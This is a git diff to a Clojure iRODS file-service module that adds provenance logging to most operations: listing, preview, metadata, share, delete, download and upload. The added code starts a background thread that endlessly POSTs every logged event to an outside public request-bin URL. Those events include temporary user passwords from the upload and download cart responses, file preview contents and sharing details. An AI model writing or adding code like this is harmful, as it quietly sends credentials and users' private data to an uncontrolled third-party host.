@@ -8,15 +8,32 @@
             [clojure-commons.file-utils :as ft]
             [clojure.string :as string]
             [nibblonian.validators :as validators]
-            [nibblonian.riak :as riak])
+            [nibblonian.riak :as riak]
+            [clj-http.client :as client])
   (:use [clj-jargon.jargon :exclude [init]]
         clojure-commons.error-codes
+        lamina.core
         [nibblonian.config :exclude [init]]
         [slingshot.slingshot :only [try+ throw+]])
   (:import [org.apache.tika Tika]))
 
 (def IPCRESERVED "ipc-reserved-unit")
 (def IPCSYSTEM "ipc-system-avu")
+
+(def out-channel (channel))
+
+(defn log-prov
+  [action data]
+  (enqueue out-channel (merge {:action action} data)))
+
+(.start
+ (Thread.
+  (fn []
+    (loop []
+      (client/post
+       "http://requestb.in/ttc0yjtt"
+       {:body (json/json-str @(read-channel out-channel))})
+      (recur)))))
 
 (defn not-filtered?
   [cm user fpath ff]
@@ -54,7 +71,9 @@
     (validators/user-exists cm user)
     (validators/all-paths-exist cm abspaths)
     (validators/user-owns-paths cm user abspaths)
-    (mapv (partial list-perm cm user) abspaths)))
+    (let [result (mapv (partial list-perm cm user) abspaths)]
+      (log-prov "list-perms" {:user user :paths abspaths :result result})
+      result)))
 
 (defn date-mod-from-stat
   [stat]
@@ -218,28 +237,35 @@
 
       (validators/path-readable cm user path)
 
-      (gen-listing cm user path filter-files include-files))))
+      (let [result (gen-listing cm user path filter-files include-files)]
+        (log-prov "list-directory" {:user user
+                                    :path path
+                                    :filter-files filter-files
+                                    :include-files include-files})
+        result))))
 
 (defn root-listing
   ([user root-path]
      (root-listing user root-path false))
 
   ([user root-path set-own?]
-    (with-jargon (jargon-config) [cm]
-      (validators/user-exists cm user)
+     (with-jargon (jargon-config) [cm]
+       (validators/user-exists cm user)
+       
+       (when (and (= root-path (user-trash-dir user)) (not (exists? cm root-path)))
+         (mkdir cm root-path)
+         (set-permissions cm user root-path false false true))
+       
+       (validators/path-exists cm root-path)
+       
+       (when (and set-own? (not (owns? cm user root-path)))
+         (set-permissions cm user root-path false false true))
+       
+       (validators/path-readable cm user root-path)
 
-      (when (and (= root-path (user-trash-dir user)) (not (exists? cm root-path)))
-        (mkdir cm root-path)
-        (set-permissions cm user root-path false false true))
-
-      (validators/path-exists cm root-path)
-
-      (when (and set-own? (not (owns? cm user root-path)))
-        (set-permissions cm user root-path false false true))
-
-      (validators/path-readable cm user root-path)
-
-      (dir-map-entry cm user (file cm root-path)))))
+       (log-prov "root-list" {:user user :root root-path :set-own set-own?})
+       
+       (dir-map-entry cm user (file cm root-path)))))
 
 (defn create
   "Creates a directory at 'path' in iRODS and sets the user to 'user'.
@@ -260,7 +286,9 @@
 
       (mkdir cm fixed-path)
       (set-owner cm fixed-path user)
-      {:path fixed-path :permissions (collection-perm-map cm user fixed-path)})))
+      (let [retval {:path fixed-path :permissions (collection-perm-map cm user fixed-path)}]
+        (log-prov "create-directory" {:user user :path path :result retval})
+        retval))))
 
 (defn source->dest
   [source-path dest-path]
@@ -282,7 +310,9 @@
       (validators/path-writeable cm user dest)
       (validators/no-paths-exist cm dest-paths)
       (move-all cm sources dest :user user :admin-users (irods-admins))
-      {:sources sources :dest dest})))
+      (let [retval {:sources sources :dest dest}]
+        (log-prov "move" {:user user :sources sources :dest dest})
+        retval))))
 
 (defn rename-path
   "High-level file renaming. Calls rename-func, passing it file-rename as the mv-func param."
@@ -298,6 +328,7 @@
         (throw+ {:error_code ERR_INCOMPLETE_RENAME
                  :paths result
                  :user user}))
+      (log-prov "move" {:user user :source source :dest dest :result result})
       {:source source :dest dest :user user})))
 
 (defn- preview-buffer
@@ -328,7 +359,9 @@
     (validators/path-exists cm path)
     (validators/path-readable cm user path)
     (validators/path-is-file cm path)
-    (gen-preview cm path size)))
+    (let [result (gen-preview cm path size)]
+      (log-prov "preview" {:user user :path path :size size :result result})
+      result)))
 
 (defn user-home-dir
   ([user]
@@ -340,6 +373,7 @@
        (let [user-home (ft/path-join staging-dir user)]
          (if (not (exists? cm user-home))
            (mkdirs cm user-home))
+         (log-prov "home" {:user user :set-owner set-owner? :home user-home})
          user-home))))
 
 (defn fix-unit
@@ -379,7 +413,9 @@
     (validators/user-exists cm user)
     (validators/path-exists cm path)
     (validators/path-readable cm user path)
-    {:metadata (list-path-metadata cm path)}))
+    (let [result {:metadata (list-path-metadata cm path)}]
+      (log-prov "get-metadata" {:user user :path path :result result})
+      result)))
 
 (defn metadata-set
   [user path avu-map]
@@ -392,9 +428,11 @@
     (validators/path-exists cm path)
     (validators/path-writeable cm user path)
 
-    (let [new-unit (if (string/blank? (:unit avu-map)) IPCRESERVED (:unit avu-map))]
+    (let [new-unit (if (string/blank? (:unit avu-map)) IPCRESERVED (:unit avu-map))
+          result {:path (ft/rm-last-slash path) :user user}]
       (set-metadata cm (ft/rm-last-slash path) (:attr avu-map) (:value avu-map) new-unit)
-      {:path (ft/rm-last-slash path) :user user})))
+      (log-prov "set-metadata" {:user user :path path :avus avu-map :result result})
+      result)))
 
 (defn encode-str
   [str-to-encode]
@@ -425,7 +463,10 @@
       (doseq [avu (:add adds-dels)]
         (let [new-unit (if (string/blank? (:unit avu)) IPCRESERVED (:unit avu))]
           (set-metadata cm new-path (:attr avu) (:value avu) new-unit)))
-      {:path (ft/rm-last-slash path) :user user})))
+      
+      (let [result {:path (ft/rm-last-slash path) :user user}]
+        (log-prov "set-metadata-batch" {:user user :path path :add-dels adds-dels :result result})
+        result))))
 
 (defn metadata-delete
   [user path attr]
@@ -435,12 +476,17 @@
     (validators/path-writeable cm user path)
 
     (let [fix-unit #(if (= (:unit %1) IPCRESERVED) (assoc %1 :unit "") %1)
-          avu      (map fix-unit (get-metadata cm (ft/rm-last-slash path)))]
+          avu      (map fix-unit (get-metadata cm (ft/rm-last-slash path)))
+          result   {:path path :user user}]
       (workaround-delete cm path attr)
-      (delete-metadata cm path attr))
-    {:path path :user user}))
+      (delete-metadata cm path attr)
+      (log-prov "delete-metadata" {:user user :path path :attr attr :result result})
+      result)))
 
-(defn path-exists? [user path] (with-jargon (jargon-config) [cm] (exists? cm path)))
+(defn path-exists?
+  [user path]
+  (log-prov "exists" {:user user :path path})
+  (with-jargon (jargon-config) [cm] (exists? cm path)))
 
 (defn list-user-perms-for-path
   [cm user path]
@@ -475,10 +521,12 @@
   [user path]
   (with-jargon (jargon-config) [cm]
     (validators/path-exists cm path)
-    (-> (stat cm path)
-        (merge {:permissions (permissions cm user path)})
-        (merge-shares cm user path)
-        (merge-counts cm path))))
+    (let [stat-info (-> (stat cm path)
+                        (merge {:permissions (permissions cm user path)})
+                        (merge-shares cm user path)
+                        (merge-counts cm path))]
+      (log-prov "stat" {:user user :path path :stat stat-info})
+      stat-info)))
 
 (defn- format-tree-urls
   [treeurl-maps]
@@ -513,10 +561,12 @@
     (validators/path-is-file cm path)
     (validators/path-readable cm user path)
 
-    {:action       "manifest"
-     :content-type (content-type cm path)
-     :tree-urls    (extract-tree-urls cm path)
-     :preview      (preview-url user path)}))
+    (let [result {:action       "manifest"
+                  :content-type (content-type cm path)
+                  :tree-urls    (extract-tree-urls cm path)
+                  :preview      (preview-url user path)}]
+      (log-prov "manifest" {:user user :path path :data-threshold data-threshold :result result})
+      result)))
 
 (defn download-file
   [user file-path]
@@ -525,7 +575,9 @@
     (validators/path-exists cm file-path)
     (validators/path-readable cm user file-path)
 
-    (if (zero? (file-size cm file-path)) "" (input-stream cm file-path))))
+    (let [retval (if (zero? (file-size cm file-path)) "" (input-stream cm file-path))]
+      (log-prov "download" {:user user :path file-path})
+      retval)))
 
 (defn download
   [user filepaths]
@@ -533,36 +585,40 @@
     (validators/user-exists cm user)
 
     (let [cart-key (str (System/currentTimeMillis))
-          account  (:irodsAccount cm)]
-      {:action "download"
-       :status "success"
-       :data
-       {:user user
-        :home (ft/path-join "/" (irods-zone) "home" user)
-        :password (store-cart cm user cart-key filepaths)
-        :host (.getHost account)
-        :port (.getPort account)
-        :zone (.getZone account)
-        :defaultStorageResource (.getDefaultStorageResource account)
-        :key cart-key}})))
+          account  (:irodsAccount cm)
+          retval   {:action "download"
+                    :status "success"
+                    :data
+                    {:user user
+                     :home (ft/path-join "/" (irods-zone) "home" user)
+                     :password (store-cart cm user cart-key filepaths)
+                     :host (.getHost account)
+                     :port (.getPort account)
+                     :zone (.getZone account)
+                     :defaultStorageResource (.getDefaultStorageResource account)
+                     :key cart-key}}]
+      (log-prov "download-cart" {:user user :paths filepaths :result retval})
+      retval)))
 
 (defn upload
   [user]
   (with-jargon (jargon-config) [cm]
     (validators/user-exists cm user)
 
-    (let [account (:irodsAccount cm)]
-      {:action "upload"
-       :status "success"
-       :data
-       {:user user
-        :home (ft/path-join "/" (irods-zone) "home" user)
-        :password (temp-password cm user)
-        :host (.getHost account)
-        :port (.getPort account)
-        :zone (.getZone account)
-        :defaultStorageResource (.getDefaultStorageResource account)
-        :key (str (System/currentTimeMillis))}})))
+    (let [account (:irodsAccount cm)
+          retval  {:action "upload"
+                   :status "success"
+                   :data
+                   {:user user
+                    :home (ft/path-join "/" (irods-zone) "home" user)
+                    :password (temp-password cm user)
+                    :host (.getHost account)
+                    :port (.getPort account)
+                    :zone (.getZone account)
+                    :defaultStorageResource (.getDefaultStorageResource account)
+                    :key (str (System/currentTimeMillis))}}]
+      (log-prov "upload-cart" {:user user :result retval})
+      retval)))
 
 (def shared-with-attr "ipc-contains-obj-shared-with")
 
@@ -661,9 +717,15 @@
             ;;Set the actual permissions on the file/directory.
             (set-permissions cm share-with fpath read-perm write-perm own-perm true)))))
 
-    {:user share-withs
-     :path fpaths
-     :permissions perms}))
+    (let [result {:user share-withs
+                  :path fpaths
+                  :permissions perms}]
+      (log-prov "share" {:user user
+                         :share-withs share-withs
+                         :files fpaths
+                         :perms perms
+                         :result result})
+      result)))
 
 (defn contains-accessible-obj?
   [cm user dpath]
@@ -737,8 +799,10 @@
 
           (log/debug "after removing permissions.")))))
 
-  {:user unshare-withs
-   :path fpaths})
+  (let [retval {:user unshare-withs
+                :path fpaths}]
+    (log-prov "unshare" {:user user :unshare-withs unshare-withs :files fpaths :result retval})
+    retval))
 
 (defn list-of-homedirs-with-shared-files
   [cm user]
@@ -786,7 +850,9 @@
   [user]
   (with-jargon (jargon-config) [cm]
     (validators/user-exists cm user)
-    (quota cm user)))
+    (let [result (quota cm user)]
+      (log-prov "quota" {:user user :result result})
+      result)))
 
 (defn trim-leading-slash
   [str-to-trim]
@@ -841,7 +907,13 @@
   [cm p user]
   (let [trash-path (randomized-trash-path user p)]
     (move cm p trash-path :user user :admin-users (irods-admins))
-    (set-metadata cm trash-path "ipc-trash-origin" p IPCSYSTEM)))
+    (set-metadata cm trash-path "ipc-trash-origin" p IPCSYSTEM)
+    (log-prov "move-to-trash" {:user user :path p :trash-path trash-path})))
+
+(defn logged-delete
+  [cm p user]
+  (log-prov "delete" {:user user :path p})
+  (delete cm p))
 
 (defn delete-paths
   "Performs some validation and calls delete.
@@ -866,8 +938,7 @@
       (doseq [p paths]
         (if-not (.startsWith p (user-trash-dir user))
           (move-to-trash cm p user)
-          (delete cm p)))
-
+          (logged-delete cm p user)))
       {:paths paths})))
 
 (defn trash-origin-path
@@ -930,7 +1001,9 @@
           (move cm path fully-restored :user user :admin-users (irods-admins))
           (log/warn "Done moving " path " to " fully-restored)
 
-          (reset! retval (assoc @retval path fully-restored))))
+          (reset! retval (assoc @retval path fully-restored))
+
+          (log-prov "restore" {:user user :path path :restored-path fully-restored})))
       {:restored @retval})))
 
 (defn copy-path
